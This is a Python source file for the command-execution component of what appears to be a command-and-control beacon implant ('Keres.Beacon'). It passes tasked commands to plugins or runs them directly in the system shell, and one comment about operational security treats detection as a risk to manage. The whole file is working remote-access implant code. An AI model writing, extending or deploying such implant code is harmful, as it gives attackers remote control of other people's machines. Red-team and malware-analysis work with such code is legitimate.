import asyncio
import logging
from plugins import load_beacon_plugins
from config import settings

logger = logging.getLogger("Keres.Beacon.Executor")


class CommandExecutor:
    def __init__(self):
        # Load local .py plugins from the /plugins directory
        self.plugins = load_beacon_plugins(settings.PLUGIN_PATH)

    async def execute(self, task_data: dict) -> str:
        """
        Routes the task to a plugin or the system shell.
        """
        command = task_data.get("command")
        args = task_data.get("args", [])

        # 1. Check for Plugin matches
        if command in self.plugins:
            try:
                return await self.plugins[command].run(args)
            except Exception as e:
                return f"Plugin Error: {str(e)}"

        # 2. Default to System Shell (subprocess)
        # Note: Be careful with OPSEC here; shell=True is noisy.
        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()

            result = stdout.decode().strip() or stderr.decode().strip()
            return result if result else "Command executed (no output)."

        except Exception as e:
            return f"Execution Error: {str(e)}"